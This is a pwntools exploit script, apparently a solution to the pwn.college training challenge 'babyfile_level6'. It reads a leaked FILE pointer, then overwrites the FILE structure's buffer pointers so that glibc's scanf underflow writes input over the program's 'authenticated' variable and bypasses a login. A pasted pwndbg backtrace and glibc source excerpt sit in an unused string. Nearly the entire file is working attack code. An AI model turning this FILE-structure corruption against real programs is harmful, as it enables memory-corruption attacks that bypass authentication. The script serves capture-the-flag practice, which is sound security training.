from pwn import *
from time import sleep
context.binary=e=ELF("./babyfile_level6")
libc=e.libc
gs="""
set listsize 50
set $glibc_src_dir="../../glibc-2.31/"
source ~/add_src.py
b *0x0000000000401A3A
b *_IO_new_file_underflow 
"""
_IO_EOF_SEEN=0x0010
_IO_NO_READS=0x0004
_IO_CURRENTLY_PUTTING=0x0800
_IO_IS_APPENDING=0x1000
_IO_IN_BACKUP=0x0100
_IO_FLAGS2_NOTCANCEL=2
_IO_MAGIC=0xFBAD0000 
_IO_MAGIC_MASK=0xFFFF0000
_IO_LINE_BUF=0x0200
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gdbscript=gs)
        #pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyfile_level6")
sleep(1)
p.recvuntil(b"fp -> 0x")
fp=int(p.recvuntil(b"\n").rstrip().decode(),16)
"""
──────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────
 ► f 0   0x7ffff7ee2fc0 read
   f 1   0x7ffff7e65b9f __GI__IO_file_underflow+383
   f 2   0x7ffff7e66f86 _IO_default_uflow+54
   f 3   0x7ffff7e39280 __vfscanf_internal+2176
   f 4   0x7ffff7e38162 __isoc99_scanf+178
   f 5         0x401a3f challenge+204
   f 6         0x401b2d main+201
   f 7   0x7ffff7df9083 __libc_start_main+243
pwndbg> list _IO_file_underflow
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;
.....
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);

"""
p.sendafter(b"Now reading from stdin directly to the FILE struct.",
               p64(0)+#flags
               p64(0x10)+p64(0x1)+p64(0)+ # read_ptr, read_end, read_base
               p64(0)+p64(0)+p64(0)+ #write_base,write_ptr,write_end
               p64(e.sym.authenticated)+p64(e.sym.authenticated+8) #buf_base,#buf_end
               
)
sleep(2)
p.sendlineafter(b"Please log in.\n",b"A"*8)
p.interactive()